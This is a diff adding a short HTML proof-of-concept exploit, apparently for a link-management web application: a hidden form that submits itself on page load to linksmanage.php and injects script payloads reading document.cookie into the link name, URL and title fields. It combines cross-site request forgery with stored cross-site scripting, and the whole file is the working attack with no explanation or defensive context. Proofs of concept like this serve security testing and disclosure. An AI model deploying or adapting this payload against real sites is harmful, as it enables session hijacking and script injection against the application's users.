@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <form action="http://localhost/linksmanage.php" method="POST">
+      <input type="hidden" name="linkname" value='"><script>alert(document.cookie)</script>' />
+      <input type="hidden" name="url" value='"><script>alert(document.cookie)</script>' />
+      <input type="hidden" name="title" value='"><script>alert(document.cookie)</script>' />
+      <input type="hidden" name="action" value="add" />
+      <input id="xss" hidden type="submit" value="Submit request" />
+    </form>
+    <script>document.getElementById("xss").click()</script>
+  </body>
+</html>
+
